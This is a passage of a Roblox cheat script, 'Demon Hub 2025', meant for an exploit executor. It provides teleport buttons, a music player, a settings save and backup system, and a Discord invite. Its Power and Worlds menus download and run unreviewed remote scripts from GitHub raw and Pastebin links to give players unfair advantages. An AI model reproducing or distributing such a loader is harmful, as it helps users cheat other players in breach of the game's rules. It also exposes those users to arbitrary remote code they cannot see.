    Utils.Notify("UI", "Effects GUI removed permanently", 3)
end)

-- 15. ═══════════════ TELEPORTATION SYSTEM ═══════════════
local TeleportLocations = {
    -- Main Areas
    {name = "Arena", cframe = CFrame.new(-18.393, 26.978, 9.003, 0.999929, 0, 0.011914, 0, 1, 0, -0.011914, 0, 0.999929)},
    {name = "Tree", cframe = CFrame.new(-143.156, 82.464, -246.582, 0.985673, 0, -0.168666, 0, 1, 0, 0.168666, 0, 0.985673)},
    {name = "Wall", cframe = CFrame.new(-251.617, 92.690, -335.043, -0.794003, 0, -0.607913, 0, 1, 0, 0.607913, 0, -0.794003)},
    {name = "Gray Wall", cframe = CFrame.new(-266.613, 119.881, -347.056, -0.698223, 0, -0.715880, 0, 1, 0, 0.715880, 0, -0.698223)},
    {name = "Secret Area", cframe = CFrame.new(-197.105, 22.953, -377.287) * CFrame.Angles(math.rad(0.044), math.rad(23.156), math.rad(0.08))},
    {name = "Outside", cframe = CFrame.new(-295.778, 25.596, -355.215, -0.409, 0, -0.913, 0, 1, 0, 0.913, 0, -0.409)},
    {name = "Gate Exterior", cframe = CFrame.new(-420.443, 25.596, -9.648, -0.0046, 0, -0.999989, 0, 1, 0, 0.999989, 0, -0.0046)},
    {name = "Rock Interior 1", cframe = CFrame.new(-341.302, 25.596, 47.305, 0.342859, 0, 0.939387, 0, 1, 0, -0.939387, 0, 0.342859)},
    {name = "Pillar Top", cframe = CFrame.new(-88.647, 70.197, 92.618, 0.952380, 0, -0.304915, 0, 1, 0, 0.304915, 0, 0.952380)},
    {name = "Rock Interior 2", cframe = CFrame.new(283.553, 25.596, 184.675, -0.423626, 0, 0.905837, 0, 1, 0, -0.905837, 0, -0.423626)},
    {name = "Rock Interior 3", cframe = CFrame.new(43.311, 25.500, -168.158, 0.168662, 0, -0.985674, 0, 1, 0, 0.985674, 0, 0.168662)},
    {name = "Main Gate", cframe = CFrame.new(5.181, 25.500, 419.471, 0.985070, 0, 0.172157, 0, 1, 0, -0.172157, 0, 0.985070)},
    {name = "Pillar Base", cframe = CFrame.new(88.735, 70.100, -84.323, -0.347119, 0, 0.937821, 0, 1, 0, -0.937821, 0, -0.347119)},
    {name = "Underground", cframe = CFrame.new(45.779, 21.812, -185.381, -0.863430, -0.497, -0.087601, 0, 0.173651, -0.984807, 0.504468, -0.850312, -0.149936)}
}

-- Create teleport buttons
for _, location in ipairs(TeleportLocations) do
    Tabs.Teleports:Button(location.name, function()
        local root = Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = location.cframe
            Utils.Notify("Teleport", "Teleported to " .. location.name, 2)
        end
    end)
end

-- Quick teleport keybinds
Tabs.Teleports:Button("Set Teleport Keybinds", function()
    Utils.Notify("Teleport", "Press 1-5 for quick teleports", 3)
    
    Services.UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        
        local keyMap = {
            [Enum.KeyCode.One] = 1,
            [Enum.KeyCode.Two] = 2,
            [Enum.KeyCode.Three] = 3,
            [Enum.KeyCode.Four] = 4,
            [Enum.KeyCode.Five] = 5
        }
        
        local index = keyMap[input.KeyCode]
        if index and TeleportLocations[index] then
            local root = Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = TeleportLocations[index].cframe
                Utils.Notify("Quick TP", "Teleported to " .. TeleportLocations[index].name, 1)
            end
        end
    end)
end)

-- 16. ═══════════════ POWER SYSTEM ═══════════════
local powerScripts = {
    {name = "1K Power (3s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/1K"},
    {name = "2K Power (6s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/2K"},
    {name = "5K Power (10s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/5K"},
    {name = "10K Power (20s intervals)", url = "https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/10K"}
}

for _, script in ipairs(powerScripts) do
    Tabs.Power:Button(script.name, function()
        Utils.LoadScript(script.url)
    end)
end

-- Power Viewer
Tabs.Power:Button("Power Stats Viewer", function()
    Utils.LoadScript("https://raw.githubusercontent.com/Nightmareloil/Own1/refs/heads/main/SECURITY.md")
end)

-- 17. ═══════════════ WORLD TELEPORTS ═══════════════
local worldScripts = {
    {name = "Coffee Shop", url = "https://pastebin.com/raw/Pvj5Ckc2"},
    {name = "Clockwork Arena", url = "https://pastebin.com/raw/NNp1NJKT"},
    {name = "Shipment", url = "https://pastebin.com/raw/J3Jk3NaC"},
    {name = "Purple Battlefields", url = "https://pastebin.com/raw/kdg5tmdg"},
    {name = "Lock Shift", url = "https://raw.githubusercontent.com/MiniNoobie/ShiftLockx/main/Shiftlock-MiniNoobie"}
}

for _, world in ipairs(worldScripts) do
    Tabs.Worlds:Button(world.name, function()
        Utils.LoadScript(world.url)
    end)
end

-- 18. ═══════════════ ENHANCED MUSIC PLAYER ═══════════════
local MusicPlayer = {
    CurrentSong = nil,
    Volume = 1,
    Songs = {
        -- Original songs
        {name = "🎵 Save Me", id = "128972545110914"},
        {name = "🎵 Rootkit", id = "5410081542"},
        {name = "🎵 Say So - Doja Cat", id = "1840036018"},
        {name = "🎵 The Future", id = "1837358800"},
        {name = "🎵 Feel Your Heart", id = "5410082171"},
        {name = "🎵 Forward", id = "5410081471"},
        {name = "🎵 No Sleep", id = "7029011778"},
        {name = "🎵 Pixel Terror", id = "5410080475"},
        {name = "🎵 Labyrinth", id = "7023690024"},
        {name = "🎵 All I Want", id = "7023680426"},
        {name = "🎵 Sacrified", id = "125847822956321"},
        {name = "🎵 Colors", id = "5410086062"},
        {name = "🎵 You Used To", id = "7023720291"},
        {name = "🎵 Rock Star", id = "108319978126931"},
        {name = "🎵 Coral Sea", id = "1839253629"},
        {name = "🎵 King", id = "1840030788"},
        {name = "🎵 Chasing Clouds", id = "5410082097"},
        {name = "🎵 Pendulum", id = "1843384804"},
        {name = "🎵 She Make Me", id = "1841807265"},
        {name = "🎵 I'm So Alone", id = "6774872457"},
        {name = "🎵 Hate Me", id = "6873260626"},
        {name = "🎵 Safe & Sound", id = "7024233823"},
        {name = "🎵 Dreamers", id = "7029083554"},
        {name = "🎵 Internet Boy", id = "5410084870"},
        {name = "🎵 Let's Play", id = "5410085763"},
        {name = "🎵 Night", id = "1836879421"},
        {name = "🎵 Pull Over", id = "1839983980"},
        {name = "🎵 WRLD - Hang Up", id = "5410084188"},
        {name = "🎵 Deja Vu", id = "6781116057"},
        {name = "🎵 Give The World", id = "1836778353"},
        {name = "🎵 Top Of The World", id = "1836847994"},
        {name = "🎵 Siren", id = "1840056866"},
        {name = "🎵 Overtime", id = "1842019862"},
        {name = "🎵 Hours", id = "7028932563"},
        {name = "🎵 Weekend Vibes", id = "1837083064"},
        {name = "🎵 Glacier", id = "7023760529"},
        {name = "🎵 Only You", id = "7024028859"},
        {name = "🎵 Hyper", id = "7023887630"},
        {name = "🎵 Play Cool", id = "7029017448"},
        {name = "🎵 What It's Like", id = "7028997537"},
        {name = "🎵 New World", id = "5410082346"},
        {name = "🎵 TOMB", id = "6782202354"},
        {name = "🎵 You Take Me", id = "7029070008"},
        {name = "🎵 Thinking About You", id = "7023445033"},
    }
}

-- Music Controls
Tabs.Music:Button("🛑 Stop All Music", function()
    -- Stop and destroy current song if managed by MusicPlayer
    if MusicPlayer.CurrentSong then
        MusicPlayer.CurrentSong:Stop()
        MusicPlayer.CurrentSong:Destroy()
        MusicPlayer.CurrentSong = nil
    end

    -- Define all locations to search for sounds
    local soundContainers = {
        Services.SoundService,
        workspace,
        Services.Lighting,
        Services.ReplicatedStorage,
        Services.Players,
        Services.StarterGui,
        Services.StarterPack
    }

    -- Recursively find and destroy all Sound instances
    for _, container in pairs(soundContainers) do
        for _, descendant in pairs(container:GetDescendants()) do
            if descendant:IsA("Sound") then
                descendant:Stop()
                descendant:Destroy()
            end
        end
    end

    Utils.Notify("Music", "All music and sounds were stopped.", 2)
end)

-- Volume Control
Tabs.Music:Slider("Volume", 0, 100, 50, function(value)
    MusicPlayer.Volume = value / 100
    if MusicPlayer.CurrentSong then
        MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
    end
end)

-- Create song buttons
for _, song in ipairs(MusicPlayer.Songs) do
    Tabs.Music:Button(song.name, function()
        -- Stop current song
        if MusicPlayer.CurrentSong then
            MusicPlayer.CurrentSong:Stop()
            MusicPlayer.CurrentSong:Destroy()
        end
        
        -- Play new song
        MusicPlayer.CurrentSong = Instance.new("Sound")
        MusicPlayer.CurrentSong.SoundId = "rbxassetid://" .. song.id
        MusicPlayer.CurrentSong.Volume = MusicPlayer.Volume
        MusicPlayer.CurrentSong.Looped = true
        MusicPlayer.CurrentSong.Parent = Services.SoundService
        MusicPlayer.CurrentSong:Play()
        
        Utils.Notify("Music", "Now playing: " .. song.name, 3)
    end)
end

-- 19. ═══════════════ SETTINGS & CLEANUP ═══════════════
-- 19.1 Auto-reconnect on disconnect
Tabs.Settings:Toggle("Auto Reconnect", false, function(state)
    if state then
        LocalPlayer.OnTeleport:Connect(function(teleportState)
            if teleportState == Enum.TeleportState.Failed then
                Utils.Notify("Reconnect", "Teleport failed, attempting reconnect...", 5)
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
            end
        end)
    end
end)

local Lighting = game:GetService("Lighting")
local Settings = Tabs.Settings
local disabledInstances = {}
local originalLighting = nil

Settings:Toggle("Performance Mode", false, function(state)
    if state then
        -- Save original lighting settings if not saved yet
        if not originalLighting then
            originalLighting = {
                Ambient = Lighting.Ambient,
                Brightness = Lighting.Brightness,
                OutdoorAmbient = Lighting.OutdoorAmbient,
                FogEnd = Lighting.FogEnd,
                ClockTime = Lighting.ClockTime,
                Sky = Lighting:FindFirstChildOfClass("Sky") and Lighting:FindFirstChildOfClass("Sky"):Clone() or nil
            }
        end

        -- Apply night mode lighting
        Lighting.Ambient = Color3.fromRGB(10, 10, 10)          -- Dark ambient
        Lighting.Brightness = 1                                -- Keep brightness moderate
        Lighting.OutdoorAmbient = Color3.fromRGB(15, 15, 20)  -- Slight blue tint
        Lighting.FogEnd = 150                                  -- Fog to limit view distance
        Lighting.ClockTime = 0                                 -- Midnight (night)

        -- Replace sky with a dark night sky if available
        local existingSky = Lighting:FindFirstChildOfClass("Sky")
        if existingSky then existingSky:Destroy() end
        if originalLighting.Sky then
            local nightSky = originalLighting.Sky:Clone()
            -- You can customize nightSky properties here if needed
            nightSky.Parent = Lighting
        end

        -- Lower rendering quality for performance
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

        -- Disable performance-heavy instances
        for _, desc in pairs(workspace:GetDescendants()) do
            if desc:IsA("ParticleEmitter") or desc:IsA("Trail") or desc:IsA("Beam") 
                or desc:IsA("Decal") or desc:IsA("Texture") 
                or desc:IsA("SpotLight") or desc:IsA("SurfaceLight") or desc:IsA("PointLight") then

                if desc:IsA("Decal") or desc:IsA("Texture") then
                    desc.Transparency = 1
                else
                    desc.Enabled = false
                end
                table.insert(disabledInstances, desc)
            end
        end

        Utils.Notify("Performance", "Performance mode and night mode enabled", 3)
    else
        -- Revert lighting settings if saved
        if originalLighting then
            for prop, value in pairs(originalLighting) do
                if prop ~= "Sky" then
                    Lighting[prop] = value
                end
            end

            -- Remove current sky and restore original sky if any
            local currentSky = Lighting:FindFirstChildOfClass("Sky")
            if currentSky then currentSky:Destroy() end
            if originalLighting.Sky then
                originalLighting.Sky.Parent = Lighting
            end
            originalLighting = nil
        end

        -- Re-enable disabled instances
        for _, inst in pairs(disabledInstances) do
            if inst and inst.Parent then
                if inst:IsA("Decal") or inst:IsA("Texture") then
                    inst.Transparency = 0
                else
                    inst.Enabled = true
                end
            end
        end
        disabledInstances = {}

        -- Restore rendering quality
        settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic

        Utils.Notify("Performance", "Performance mode disabled", 3)
    end
end)

-- 19.3 Discord Webhook Integration
Tabs.Settings:Button("Join Discord", function()
    local discordInvite = "https://discord.com/invite/J7AYrApFAH"
    
    -- Try to copy to clipboard with error handling
    local success, error = pcall(function()
        setclipboard(discordInvite)
    end)
    
    if success then
        Utils.Notify("Discord", "Discord invite copied to clipboard!", 3)
    else
        Utils.Notify("Discord", "Failed to copy invite. Please visit: " .. discordInvite, 5)
        warn("Clipboard error: " .. tostring(error))
    end
end)

-- 19.4 Enhanced Save/Load Settings System
local SettingsManager = {}

-- Configuration
local CONFIG_VERSION = "2.0"
local AUTO_SAVE_INTERVAL = 300 -- 5 minutes
local MAX_BACKUPS = 5

-- File paths
local function getConfigPath()
    return "ScriptSettings_" .. game.PlaceId .. ".json"
end

local function getBackupPath(index)
    return "ScriptSettings_" .. game.PlaceId .. "_backup" .. index .. ".json"
end

-- Default configuration
local function createDefaultConfig()
    return {
        WalkSpeed = 16,
        JumpPower = 50,
        States = {},
        Volume = 0.5,
        LastSaved = os.time(),
        Version = CONFIG_VERSION,
        AutoSave = true,
        BackupCount = 0,
        GameVersion = game.PlaceVersion or "Unknown"
    }
end

-- Enhanced save function with backup system
local function saveSettings(showNotification)
    local success, error = pcall(function()
        local config = {
            WalkSpeed = Movement and Movement.WalkSpeed or 16,
            JumpPower = Movement and Movement.JumpPower or 50,
            States = States or {},
            Volume = MusicPlayer and MusicPlayer.Volume or 0.5,
            LastSaved = os.time(),
            Version = CONFIG_VERSION,
            AutoSave = SettingsManager.AutoSave or true,
            BackupCount = (SettingsManager.BackupCount or 0) + 1,
            GameVersion = game.PlaceVersion or "Unknown"
        }
        
        -- Convert to JSON string
        local configString = HttpService:JSONEncode(config)
        
        if writefile then
            local configPath = getConfigPath()
            
            -- Create backup if file exists
            if isfile(configPath) then
                local backupIndex = (config.BackupCount % MAX_BACKUPS) + 1
                local backupPath = getBackupPath(backupIndex)
                
                -- Save current config as backup
                local currentConfig = readfile(configPath)
                writefile(backupPath, currentConfig)
            end
            
            -- Save new config
            writefile(configPath, configString)
            
            if showNotification then
                Utils.Notify("Settings", "Settings saved successfully (Backup #" .. config.BackupCount .. ")", 2)
            end
        else
            -- Fallback storage methods
            if syn and syn.write_file then
                syn.write_file(getConfigPath(), configString)
                if showNotification then
                    Utils.Notify("Settings", "Settings saved (Synapse)", 2)
                end
            elseif setclipboard then
                setclipboard(configString)
                if showNotification then
                    Utils.Notify("Settings", "Settings saved to clipboard (no file system)", 2)
                end
            else
                if showNotification then
                    Utils.Notify("Settings", "No save method available", 3)
                end
            end
        end
        
        SettingsManager.BackupCount = config.BackupCount
    end)
    
    if not success then
        if showNotification then
            Utils.Notify("Settings", "Failed to save: " .. tostring(error), 3)
        end
        warn("Save error: " .. tostring(error))
    end
    
    return success
end

-- Enhanced load function with backup recovery
local function loadSettings(showNotification)
    local success, error = pcall(function()
        local configPath = getConfigPath()
        local config = nil
        
        -- Try to load main config
        if readfile and isfile(configPath) then
            local configString = readfile(configPath)
            config = HttpService:JSONDecode(configString)
        elseif syn and syn.read_file then
            config = HttpService:JSONDecode(syn.read_file(configPath))
        end
        
        -- If main config failed, try backups
        if not config then
            for i = 1, MAX_BACKUPS do
                local backupPath = getBackupPath(i)
                if isfile(backupPath) then
                    local backupString = readfile(backupPath)
                    local backupConfig = HttpService:JSONDecode(backupString)
                    if backupConfig and backupConfig.Version then
                        config = backupConfig
                        if showNotification then
                            Utils.Notify("Settings", "Loaded from backup #" .. i, 2)
                        end
                        break
                    end
                end
            end
        end
        
        if not config then
            config = createDefaultConfig()
            if showNotification then
                Utils.Notify("Settings", "Using default settings", 2)
            end
        end
        
        -- Version migration
        if config.Version ~= CONFIG_VERSION then
            config = migrateConfig(config)
        end
        
        -- Apply settings with validation
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(tonumber(config.WalkSpeed) or 16, 1, 500)
        end
        
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(tonumber(config.JumpPower) or 50, 1, 1000)
        end
        
        if config.States and type(config.States) == "table" then
            for key, value in pairs(config.States) do
                if type(value) == "boolean" then
                    States[key] = value
                end
            end
        end
        
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(tonumber(config.Volume) or 0.5, 0, 1)
        end
        
        -- Store manager settings
        SettingsManager.AutoSave = config.AutoSave
        SettingsManager.BackupCount = config.BackupCount or 0
        
        if showNotification then
            Utils.Notify("Settings", "Settings loaded successfully", 2)
        end
    end)
    
    if not success then
        if showNotification then
            Utils.Notify("Settings", "Failed to load: " .. tostring(error), 3)
        end
        warn("Load error: " .. tostring(error))
    end
    
    return success
end

-- Config migration function
local function migrateConfig(oldConfig)
    local newConfig = createDefaultConfig()
    
    -- Migrate old values to new structure
    if oldConfig.WalkSpeed then newConfig.WalkSpeed = oldConfig.WalkSpeed end
    if oldConfig.JumpPower then newConfig.JumpPower = oldConfig.JumpPower end
    if oldConfig.States then newConfig.States = oldConfig.States end
    if oldConfig.Volume then newConfig.Volume = oldConfig.Volume end
    if oldConfig.AutoSave then newConfig.AutoSave = oldConfig.AutoSave end
    if oldConfig.BackupCount then newConfig.BackupCount = oldConfig.BackupCount end
    
    return newConfig
end

-- Auto-save system
local autoSaveConnection = nil
local function startAutoSave()
    if autoSaveConnection then
        autoSaveConnection:Disconnect()
    end
    
    autoSaveConnection = task.spawn(function()
        while SettingsManager.AutoSave do
            task.wait(AUTO_SAVE_INTERVAL)
            if SettingsManager.AutoSave then
                saveSettings(false) -- Don't show notification for auto-save
            end
        end
    end)
end

-- Initialize auto-save
SettingsManager.AutoSave = true
startAutoSave()

-- UI Buttons
Tabs.Settings:Button("Save Settings", function()
    saveSettings(true)
end)

Tabs.Settings:Button("Load Settings", function()
    loadSettings(true)
end)

-- Auto-save toggle
Tabs.Settings:Toggle("Auto Save", SettingsManager.AutoSave, function(state)
    SettingsManager.AutoSave = state
    if state then
        startAutoSave()
        Utils.Notify("Auto Save", "Auto save enabled (every 5 minutes)", 2)
    else
        if autoSaveConnection then
            autoSaveConnection:Disconnect()
        end
        Utils.Notify("Auto Save", "Auto save disabled", 2)
    end
end)

-- Backup management
Tabs.Settings:Button("Restore from Backup", function()
    local success, error = pcall(function()
        local backupFound = false
        local backupList = {}
        
        -- Find all available backups
        for i = 1, MAX_BACKUPS do
            local backupPath = getBackupPath(i)
            if isfile(backupPath) then
                local backupString = readfile(backupPath)
                local backupConfig = HttpService:JSONDecode(backupString)
                if backupConfig and backupConfig.LastSaved then
                    table.insert(backupList, {
                        index = i,
                        date = os.date("%Y-%m-%d %H:%M:%S", backupConfig.LastSaved),
                        config = backupConfig
                    })
                    backupFound = true
                end
            end
        end
        
        if not backupFound then
            Utils.Notify("Backup", "No backups found", 2)
            return
        end
        
        -- Sort by date (newest first)
        table.sort(backupList, function(a, b)
            return a.config.LastSaved > b.config.LastSaved
        end)
        
        -- Use the newest backup
        local newestBackup = backupList[1]
        
        -- Apply the backup
        local config = newestBackup.config
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(config.WalkSpeed, 1, 500)
        end
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(config.JumpPower, 1, 1000)
        end
        if config.States then
            for key, value in pairs(config.States) do
                States[key] = value
            end
        end
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(config.Volume, 0, 1)
        end
        
        Utils.Notify("Backup", "Restored from backup: " .. newestBackup.date, 3)
    end)
    
    if not success then
        Utils.Notify("Backup", "Failed to restore: " .. tostring(error), 3)
    end
end)

-- Enhanced reset with better confirmation
local resetConfirmation = false
local resetTimer = nil

Tabs.Settings:Button("Reset Everything", function()
    if not resetConfirmation then
        resetConfirmation = true
        Utils.Notify("Reset", "Click again within 5 seconds to confirm COMPLETE RESET", 3)
        
        -- Auto-cancel confirmation after 5 seconds
        resetTimer = task.spawn(function()
            task.wait(5)
            resetConfirmation = false
            Utils.Notify("Reset", "Reset cancelled", 1)
        end)
        return
    end
    
    -- Cancel the timer
    if resetTimer then
        task.cancel(resetTimer)
    end
    
    local success, error = pcall(function()
        -- Create backup before reset
        saveSettings(false)
        
        -- Safely disconnect all connections
        if Connections then
            for name, connection in pairs(Connections) do
                if connection and typeof(connection) == "RBXScriptConnection" then
                    connection:Disconnect()
                end
            end
            Connections = {}
        end
        
        -- Reset states safely
        if States then
            for key in pairs(States) do
                States[key] = false
            end
        end
        
        -- Stop music safely
        if MusicPlayer and MusicPlayer.CurrentSong then
            if MusicPlayer.CurrentSong.IsPlaying then
                MusicPlayer.CurrentSong:Stop()
            end
            MusicPlayer.CurrentSong:Destroy()
            MusicPlayer.CurrentSong = nil
        end
        
        -- Reset movement values
        if Movement then
            Movement.WalkSpeed = 16
            Movement.JumpPower = 50
        end
        
        -- Reset player to defaults
        local player = Players.LocalPlayer
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            local humanoid = player.Character.Humanoid
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
        end
        
        -- Stop auto-save
        SettingsManager.AutoSave = false
        if autoSaveConnection then
            autoSaveConnection:Disconnect()
        end
        
        resetConfirmation = false
        Utils.Notify("Reset", "Everything reset successfully (backup created)", 3)
    end)
    
    if not success then
        Utils.Notify("Reset", "Reset failed: " .. tostring(error), 3)
        warn("Reset error: " .. tostring(error))
        resetConfirmation = false
    end
end)

-- Enhanced export with metadata
Tabs.Settings:Button("Export Settings", function()
    local success, error = pcall(function()
        local config = {
            WalkSpeed = Movement and Movement.WalkSpeed or 16,
            JumpPower = Movement and Movement.JumpPower or 50,
            States = States or {},
            Volume = MusicPlayer and MusicPlayer.Volume or 0.5,
            GameId = game.PlaceId,
            GameName = game.Name,
            ExportDate = os.date("%Y-%m-%d %H:%M:%S"),
            ExportTime = os.time(),
            Version = CONFIG_VERSION,
            PlayerName = Players.LocalPlayer.Name,
            AutoSave = SettingsManager.AutoSave
        }
        
        local configString = HttpService:JSONEncode(config)
        
        if setclipboard then
            setclipboard(configString)
            Utils.Notify("Export", "Settings exported to clipboard", 2)
        else
            -- Fallback: try to save to file with export name
            if writefile then
                local exportPath = "Export_" .. os.date("%Y%m%d_%H%M%S") .. ".json"
                writefile(exportPath, configString)
                Utils.Notify("Export", "Settings exported to: " .. exportPath, 3)
            else
                Utils.Notify("Export", "No export method available", 3)
            end
        end
    end)
    
    if not success then
        Utils.Notify("Export", "Export failed: " .. tostring(error), 3)
        warn("Export error: " .. tostring(error))
    end
end)

-- Enhanced import with validation
Tabs.Settings:Button("Import Settings", function()
    local success, error = pcall(function()
        local clipboardContent = ""
        
        if getclipboard then
            clipboardContent = getclipboard()
        else
            Utils.Notify("Import", "Clipboard access not available", 3)
            return
        end
        
        if not clipboardContent or clipboardContent == "" then
            Utils.Notify("Import", "Clipboard is empty", 2)
            return
        end
        
        local config = HttpService:JSONDecode(clipboardContent)
        
        -- Validate imported data
        if not config or type(config) ~= "table" then
            Utils.Notify("Import", "Invalid settings format", 3)
            return
        end
        
        -- Check version compatibility
        if config.Version and config.Version ~= CONFIG_VERSION then
            Utils.Notify("Import", "Version mismatch - attempting migration", 2)
            config = migrateConfig(config)
        end
        
        -- Show import info
        if config.ExportDate then
            Utils.Notify("Import", "Importing settings from: " .. config.ExportDate, 2)
        end
        
        -- Apply imported settings with validation
        if config.WalkSpeed and Movement then
            Movement.WalkSpeed = math.clamp(tonumber(config.WalkSpeed) or 16, 1, 500)
        end
        
        if config.JumpPower and Movement then
            Movement.JumpPower = math.clamp(tonumber(config.JumpPower) or 50, 1, 1000)
        end
        
        if config.States and type(config.States) == "table" then
            for key, value in pairs(config.States) do
                if type(value) == "boolean" then
                    States[key] = value
                end
            end
        end
        
        if config.Volume and MusicPlayer then
            MusicPlayer.Volume = math.clamp(tonumber(config.Volume) or 0.5, 0, 1)
        end
        
        if config.AutoSave ~= nil then
            SettingsManager.AutoSave = config.AutoSave
        end
        
        Utils.Notify("Import", "Settings imported successfully", 2)
        
        -- Auto-save after import
        task.wait(1)
        saveSettings(false)
    end)
    
    if not success then
        Utils.Notify("Import", "Import failed: " .. tostring(error), 3)
        warn("Import error: " .. tostring(error))
    end
end)

-- Load settings on startup
task.spawn(function()
    task.wait(2) -- Wait for everything to initialize
    loadSettings(false)
end)

-- 20. ═══════════════ FINAL SETUP & CREDITS ═══════════════
-- Auto-update character references
LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    Humanoid = newChar:WaitForChild("Humanoid")
    RootPart = newChar:WaitForChild("HumanoidRootPart")
    
    -- Reapply settings
    Humanoid.WalkSpeed = Movement.WalkSpeed
    Humanoid.JumpPower = Movement.JumpPower
end)

-- Credits section
Tabs.Settings:Button("Credits", function()
 Utils.Notify("Credits", "Demon Hub 2025 | CORRUPT CORE • Engineered by Alzn", 5)
 Utils.Notify("Credits", "Concept legacy upheld — evolution by xc3vh", 5)
end)

-- Completion message
print([[
╔══════════════════════════════════════════════════════════════════════════╗
║                   DEMON HUB 2025 — CORRUPT CORE EDITION                  ║
║                        Successfully Loaded!                              ║
║                                                                          ║
║  Features:                                                               ║
║    • Streamlined UI for better organization                              ║
║    • Enhanced error handling and security                                ║
║    • Optimized for high performance                                      ║
║    • Improved state and memory management                                ║
║    • Clean, modular, professional codebase                               ║
║    • New features and powerful enhancements                              ║
║                                                                          ║
║                 Press Insert to toggle the UI                            ║
╚══════════════════════════════════════════════════════════════════════════╝
]])

local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local MainUI = CoreGui:WaitForChild("Discord")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Insert then
        if MainUI:IsA("ScreenGui") then
            MainUI.Enabled = not MainUI.Enabled
            Utils.Notify("UI", MainUI.Enabled and "UI Shown" or "UI Hidden", 1)
        else
            MainUI.Visible = not MainUI.Visible
            Utils.Notify("UI", MainUI.Visible and "UI Shown" or "UI Hidden", 1)
        end
    end
end)
-- ═══════════════ END OF DEMON HUB 2025 CORE EDITION ═══════════════
